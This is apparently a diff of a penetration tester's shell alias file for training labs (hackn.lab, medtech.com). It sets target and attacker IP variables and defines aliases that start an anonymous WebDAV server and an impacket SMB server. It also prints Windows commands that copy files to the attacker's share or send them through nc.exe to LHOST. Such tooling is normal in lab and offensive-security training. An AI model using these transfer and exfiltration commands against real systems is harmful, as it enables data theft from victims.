@@ -2,8 +2,11 @@
 #$DOMAIN = hackn.lab or medtech.com
 #$DC = server01.hackn.lab or dc01.medtech.com
 # alias example='(){ echo Your arg was $1. ;}'
+
 export RHOST="192.168.186.189"
 export LHOST="192.168.45.225"
+export RHOST="192.168.197.153"
+export LHOST="192.168.45.158"
 export RPORT=""
 export LPORT=""
 export USERNAME=""
@@ -62,7 +65,7 @@ alias startWebDav='(){wsgidav --host=0.0.0.0 --port=80 --auth=anonymous --root /
 alias wtransfer='(){echo copy-item "$1"\\\\\\"$LHOST"\\share\\"$1"}'
 alias wtransfernc='(){echo "nc.exe "$LHOST" "$LPORT" -w 3 < "$1""}'
 alias wtransfernc_kali='echo nc -lvp "$LPORT" > FiletoDownload'
-alias smbsrv='impacket-smbserver -smb2support -username kali -password kali share .' #transfer
+alias smbsrv='printf '%s' "net use \\\\$LHOST\share /user:kali kali " ;impacket-smbserver -smb2support -username kali -password kali share .' #transfer
 alias smbtransfer_REQUIRED="echo net use '\\\\\\'"$LHOST"'\\'share /user:kali kali"
 alias smbtransfer='(){echo copy-item "$1" \\\\\\"$LHOST":445\\share\\"$1"}' # MUST USE NET USE FIRST TO CONNECT
 
